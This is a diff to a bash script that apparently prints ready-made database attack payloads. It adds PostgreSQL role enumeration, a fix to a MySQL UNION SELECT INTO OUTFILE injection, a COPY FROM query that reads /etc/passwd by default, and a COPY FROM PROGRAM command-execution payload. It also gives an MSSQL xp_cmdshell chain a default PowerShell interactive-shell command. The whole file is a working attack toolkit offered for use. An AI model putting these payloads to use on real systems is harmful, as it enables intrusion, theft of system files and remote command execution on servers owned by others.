@@ -21,6 +21,30 @@ get_mysql_commands() {
 
 }
 
+get_psql_commands() {
+    echo 'PostgreSQL database commands'
+    echo '\l'
+    echo '\c [database]'
+    echo '\dt'
+    echo 'SELECT * FROM users LIMIT 3;'
+    echo 'CREATE OR REPLACE VIEW public.my_roles
+AS WITH RECURSIVE cte AS (
+         SELECT pg_roles.oid,
+            pg_roles.rolname
+           FROM pg_roles
+          WHERE pg_roles.rolname = CURRENT_USER
+        UNION ALL
+         SELECT m.roleid,
+            pgr.rolname
+           FROM cte cte_1
+             JOIN pg_auth_members m ON m.member = cte_1.oid
+             JOIN pg_roles pgr ON pgr.oid = m.roleid
+        )
+ SELECT array_agg(cte.rolname) AS my_roles
+   FROM cte;'
+
+}
+
 get_sqli_commands() {
     echo 'SQL Injection commands'
     echo "OR 1=1 in (Select $cmd) INTO OUTFILE "   
@@ -85,14 +109,33 @@ get_mysql_injection() {
         num_sql_front_null=0
     fi
     local back_null_values=""
-    for ((i=1; i<=num_sql_null; i++)); do
-        null_values+=", null"
+    for ((i=1; i<=num_sql_back_null; i++)); do
+        back_null_values+=", null"
     done
     if [[ ! -z "$union_select" ]] && [[ $union_select == true ]]; then
-        echo  " UNION SELECT \"$cmd')\" $null_values INTO OUTFILE \"$outfile_location\""
+        echo  " UNION SELECT \"$cmd'\" $back_null_values INTO OUTFILE \"$outfile_location\""
     else
         echo  " OR 1=1 IN (Select '$cmd') INTO OUTFILE \"$outfile_location\""
     fi
+}
+
+get_postgresql_read_files() {
+    if [[ -z "$file_path" ]]; then
+        file_path="/etc/passwd"
+    fi
+    echo 'CREATE TABLE read_files(output text);'
+    echo "COPY read_files FROM ('$file_path');"
+    echo 'SELECT * FROM read_files;'
+}
+
+get_postgresql_injection_execute_server_program() {
+
+    if [[ -z "$cmd" ]]; then
+        cmd="ls -al"
+    fi
+    echo 'CREATE TABLE shell(output text);'
+    echo "COPY shell FROM PROGRAM '$cmd';"
+
 }
 
 get_postgresql_injection() {
@@ -106,5 +149,8 @@ get_postgresql_injection() {
 }
 
 get_mssql_injection() {
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
     echo "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXECUTE xp_cmdshell '$cmd' --//"
 }
